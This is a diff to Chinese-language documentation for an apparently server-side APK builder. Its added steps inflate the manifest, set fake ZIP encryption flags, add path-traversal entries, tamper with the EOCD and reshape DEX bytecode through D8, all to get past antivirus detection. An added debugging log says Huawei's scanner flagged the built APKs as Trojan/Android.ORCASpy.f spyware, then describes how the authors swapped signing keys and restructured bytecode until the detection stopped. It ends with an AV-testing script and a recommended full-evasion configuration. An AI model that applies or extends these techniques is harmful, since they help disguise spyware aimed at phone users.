@@ -23,13 +23,17 @@ app/Services/ApkBuilder/
 ├── Encryptor.php           # AES-128-CBC 加密服务
 ├── SmaliProcessor.php      # Smali 字节码处理
 ├── Obfuscator.php          # 代码混淆
-└── ApkProtector.php        # APK 保护（DEX加密、完整性校验）
+├── ApkProtector.php        # APK 保护（DEX加密、完整性校验）
+└── ApkBuilderConstants.php # 常量定义（包名词库等）
 
 app/Exceptions/ApkBuilder/
 └── ApkBuildException.php   # 自定义异常
 
 app/Console/Commands/
 └── BuildApkCommand.php     # Artisan 命令
+
+app/scripts/
+└── test-av-detection.sh    # AV 检测自动化测试脚本
 ```
 
 ## 构建流程
@@ -57,17 +61,27 @@ app/Console/Commands/
 │           ↓                                                     │
 │  9. shuffle_classes       类名混淆（可选）                      │
 │           ↓                                                     │
-│ 10. encrypt_resources     加密 assets 资源                      │
+│ 10. obfuscate_strings     字符串混淆（可选）                    │
 │           ↓                                                     │
-│ 11. build_apk             使用 apktool 重新打包                 │
+│ 11. encrypt_strings       字符串加密（可选）                    │
 │           ↓                                                     │
-│ 12. protect_apk           APK 保护（可选）                      │
+│ 12. encrypt_resources     加密 assets 资源                      │
 │           ↓                                                     │
-│ 13. modify_dex            DEX 修改（可选）                      │
+│ 13. inflate_manifest      膨胀 Manifest 至 765MB（可选）        │
 │           ↓                                                     │
-│ 14. sign_apk              签名（zipalign + apksigner/jarsigner）│
+│ 14. build_apk             使用 apktool 重新打包                 │
 │           ↓                                                     │
-│ 15. move_output           移动到输出目录                        │
+│ 15. r8_obfuscate          D8 字节码重组（可选，绕过 AV 签名）   │
+│           ↓                                                     │
+│ 16. apk_editor            APKEditor 重打包（可选）              │
+│           ↓                                                     │
+│ 17. modify_dex            DEX 头部修改（可选）                  │
+│           ↓                                                     │
+│ 18. protect_apk           假加密标志 + ZIP 保护（可选）         │
+│           ↓                                                     │
+│ 19. sign_apk              签名（apksigner v2）                  │
+│           ↓                                                     │
+│ 20. move_output           移动到输出目录                        │
 │                                                                 │
 └─────────────────────────────────────────────────────────────────┘
 ```
@@ -219,8 +233,7 @@ echo "构建耗时: " . $result->formatTime();
     "user_id": "1",
     "app_name": "我的应用",
     "app_version": "1.0.0",
-    "user_host": "ws.example.com:8080",
-    "use_wss": true,
+    "websocket_url": "ws://example.com:8081",
     "icon_path": "custom_icon.png",
     "background_path": "splash.png",
     "login_title": "欢迎使用",
@@ -228,10 +241,15 @@ echo "构建耗时: " . $result->formatTime();
     "login_btn": "开始",
     "enable_junk_classes": true,
     "enable_class_shuffle": true,
-    "enable_apk_protection": false,
-    "enable_dex_modification": false,
+    "enable_string_obfuscation": true,
+    "enable_apk_protection": true,
+    "enable_dex_modification": true,
+    "enable_fake_encryption": true,
+    "enable_multi_package_junk": true,
+    "enable_path_traversal_entries": true,
+    "enable_r8_obfuscation": true,
     "junk_class_count": 100,
-    "junk_method_count": 20
+    "fake_entry_count": 320
 }
 ```
 
@@ -270,10 +288,19 @@ echo "构建耗时: " . $result->formatTime();
 | `notifyMsg` | string | | `on` | 免杀保护（`on`=开启, `off`=关闭） |
 | `enableJunkClasses` | bool | | `false` | 启用垃圾类生成 |
 | `enableClassShuffle` | bool | | `false` | 启用类名混淆 |
-| `enableApkProtection` | bool | | `false` | 启用 APK 保护 |
-| `enableDexModification` | bool | | `false` | 启用 DEX 修改 |
+| `enableStringObfuscation` | bool | | `false` | 启用字符串变量名混淆 |
+| `enableFullStringEncryption` | bool | | `false` | 启用 const-string XOR 加密 |
+| `enableApkProtection` | bool | | `false` | 启用 APK 保护（Manifest 膨胀 + APKEditor + ZIP 保护） |
+| `enableDexModification` | bool | | `false` | 启用 DEX 头部修改 |
+| `enableFakeEncryption` | bool | | `false` | 启用 ZIP 假加密标志（0xF741） |
+| `enablePathTraversalEntries` | bool | | `false` | 启用路径穿越假条目 |
+| `enableEocdTampering` | bool | | `false` | 启用 EOCD 篡改 |
+| `enableMultiPackageJunk` | bool | | `false` | 启用三层包分布垃圾类 |
+| `enableR8Obfuscation` | bool | | `false` | 启用 D8 字节码重组（绕过 AV 签名匹配） |
 | `junkClassCount` | int | | `50` | 垃圾类数量 |
 | `junkMethodCount` | int | | `10` | 每个垃圾类的方法数 |
+| `fakeEntryCount` | int | | `120` | ZIP 假条目数量（建议 320） |
+| `fakeComponentCount` | int | | `28` | 假 Android 组件数量 |
 
 ### 验证规则
 
@@ -309,8 +336,12 @@ RUN sdkmanager "build-tools;34.0.0"
 | 工具 | 用途 | 位置 |
 |------|------|------|
 | `apktool.jar` | APK 反编译/重打包 | `storage/app/apk/tools/` |
-| `debug.keystore` | APK 签名（自动生成） | `storage/app/apk/tools/` |
-| Java 17+ | 运行构建工具 | 系统安装 |
+| `APKEditor.jar` | APK ZIP 结构重打包 | `storage/app/apk/tools/` |
+| `r8.jar` | D8 DEX 编译器（字节码重组） | `storage/app/apk/tools/` |
+| `dex2jar/` | DEX ↔ JAR 转换工具集 | `storage/app/apk/tools/dex2jar/` |
+| `signapk.jar` | APK 签名工具 | `storage/app/apk/tools/` |
+| `release.keystore` | APK 签名密钥（自动生成） | `storage/app/apk/tools/` |
+| Java 11+ | 运行构建工具 | 系统安装 |
 | zipalign | APK 对齐优化 | Android SDK |
 | apksigner | APK 签名 | Android SDK |
 
@@ -325,8 +356,17 @@ storage/app/
 │   │   ├── res/
 │   │   └── smali/
 │   └── tools/
-│       ├── apktool.jar
-│       └── debug.keystore  # 自动生成
+│       ├── apktool.jar     # APK 反编译/重打包
+│       ├── APKEditor.jar   # ZIP 结构重打包
+│       ├── r8.jar          # D8 DEX 编译器
+│       ├── signapk.jar     # 签名工具
+│       ├── release.keystore # 签名密钥（自动生成）
+│       ├── .keystore_meta.json
+│       ├── dex2jar/        # DEX ↔ JAR 转换工具集
+│       │   ├── d2j-dex2jar.sh
+│       │   └── ...
+│       ├── aapt2           # Android 资源编译器
+│       └── debug.keystore
 └── public/
     ├── apk/                # 构建输出
     │   └── {user_id}/
@@ -550,6 +590,111 @@ APK 运行时检测 `AsstsKey` 是否等于默认占位符 `[AST-PAS]`：
 |--------|-------------|-----------|-----------|
 | `[USE-AUTOGRANT]` | `loadingText`（加载页标题） | `useAtoprims` ("0"/"1") | `loginTitle` ("欢迎使用") |
 | `[AST-PAS]` | `AsstsKey`（assets 解密密钥） | 正确 | 正确 |
+
+---
+
+### 2026-03-12: APK 报毒问题（华为 HISEC — Trojan/Android.ORCASpy.f）
+
+#### 问题描述
+
+构建的 APK 在华为手机（FIN-AL60, Android 12）上安装后被检测为"病毒应用"（`Trojan/Android.ORCASpy.f[pry,rmt,spy,gen]`），华为内置 AVL + 360 双引擎在 3 秒内完成本地静态签名匹配。
+
+#### 调试过程
+
+**第一阶段：签名证书问题**
+
+发现 `storage/app/apk/tools/certificate.pem` + `key.pk8` 是 AOSP 测试签名证书（`CN=Android, OU=Android, O=Android`），该证书指纹被全球 AV 引擎收录为已知恶意软件签名。删除后签名自动 fallback 到 `release.keystore`（`CN=App, OU=Mobile, O=Company`）。
+
+但删除 AOSP testkey 后仍然报毒 — 之前的 PASS 是 `test-av-detection.sh` 检测逻辑有 bug（误报）。
+
+**第二阶段：caobizy.apk 对比分析**
+
+关键发现：caobizy.apk **不是**旧版 EaodWorker.exe 构建的，而是从 Android Studio 用 R8/ProGuard 编译的原生 APK。证据：
+- `Lmyobfuscated/` 出现上万次（R8 编译器产物）
+- 无 DexEditor/APKProtector/APKEditor/apktool 痕迹
+- 7 个 DEX 文件（R8 multidex 自然产物）
+
+**第三阶段：字节码模式签名匹配**
+
+两个 APK 都包含相同的恶意代码特征字符串（`icontrol`、`protector`、`AccessibilityService` 等），但 caobizy 通过了扫描。说明 AV 的 ORCASpy.f 签名匹配的是**方法体字节码模式**（寄存器分配、指令序列、控制流结构），不是简单的字符串匹配。
+
+caobizy 通过 R8 编译后字节码结构被彻底重组，签名无法匹配。我们的 APK 通过 apktool 反编译→重打包，保留了原始 stub 模板的字节码模式。
+
+**第四阶段：D8 字节码重组方案**
+
+R8 会删除/合并类，破坏 Manifest 中的组件引用（AXML 中的类名无法被 R8 更新）。改用 D8（纯 DEX 编译器）：DEX → dex2jar → JAR → D8 → DEX。往返转换改变了寄存器分配和指令排序，足以破坏 AV 字节码模式签名，且不删除/重命名任何类。
+
+#### 根因总结
+
+| 层级 | 根因 | 解决方案 |
+|------|------|---------|
+| 签名证书 | AOSP testkey 在 AV 黑名单 | 删除 `certificate.pem` + `key.pk8`，使用 `release.keystore` |
+| 字节码模式 | DEX 保留原始 stub 字节码结构，匹配 ORCASpy.f 签名 | D8 往返转换重组字节码（`enableR8Obfuscation`） |
+| ZIP 标志位 | `FAKE_ENCRYPTION_FLAG` 不够强 | 从 `0x0041` 改为 `0xF741`（对齐 caobizy 的 `0xff49`） |
+
+#### 代码改动
+
+| 文件 | 改动 |
+|------|------|
+| `ApkBuilder.php` | 新增 `r8Obfuscate()` 步骤 + `extractManifestComponentClasses()` |
+| `ApkBuildConfig.php` | 新增 `enableR8Obfuscation` 配置开关 |
+| `ApkProtector.php` | `FAKE_ENCRYPTION_FLAG` 从 `0x0041` 改为 `0xF741` |
+| `scripts/test-av-detection.sh` | 修复早期检测误报 + `pm list` 重试机制 |
+| `storage/app/apk/tools/` | 删除 AOSP testkey，新增 `r8.jar` + `dex2jar/` |
+
+#### D8 字节码重组流程
+
+```
+apktool build 产出 APK
+        ↓
+从 APK 提取 classes*.dex (ZipArchive)
+        ↓
+dex2jar: DEX → JAR (每个 DEX 单独转换)
+        ↓
+D8: 所有 JAR → DEX (java -cp r8.jar com.android.tools.r8.D8)
+        ↓
+替换 APK 中的 DEX 文件 (ZipArchive)
+        ↓
+继续 APKEditor → modify_dex → protect_apk → sign_apk
+```
+
+#### 华为 AV 扫描链（logcat 逆向分析）
+
+```
+AntiVirusReceiver.onReceive（安装触发）
+  → AntiVirusScanService（启动 security_scan 进程）
+    → AvlAntivirusEngine + QihooAntivirusEngine（AVL + 360 双引擎并行）
+      → AiProtectionPlugin.setStaticVirusScanResult（扫描结果回调）
+        → 如果检测到病毒:
+          → Restriction_MaliciousAppChangedHandler: EXIST_MALICIOUS_APP
+          → VIRUS_NEW 广播
+          → VirusNotifyService（弹出病毒通知）
+        → 如果未检测到:
+          → 无后续动作
+  → getControlStrategy（云端信誉查询，约 15 秒后）
+```
+
+#### AV 检测测试脚本
+
+```bash
+# 构建 + 安装 + AV 检测一体化测试
+./scripts/test-av-detection.sh /var/www/html/storage/apk-build-config.json
+
+# 推荐的全保护配置
+{
+    "enable_apk_protection": true,
+    "enable_dex_modification": true,
+    "enable_fake_encryption": true,
+    "enable_junk_classes": true,
+    "enable_class_shuffle": true,
+    "enable_string_obfuscation": true,
+    "enable_multi_package_junk": true,
+    "enable_path_traversal_entries": true,
+    "enable_r8_obfuscation": true,
+    "fake_entry_count": 320,
+    "junk_class_count": 100
+}
+```
 
 ---
 
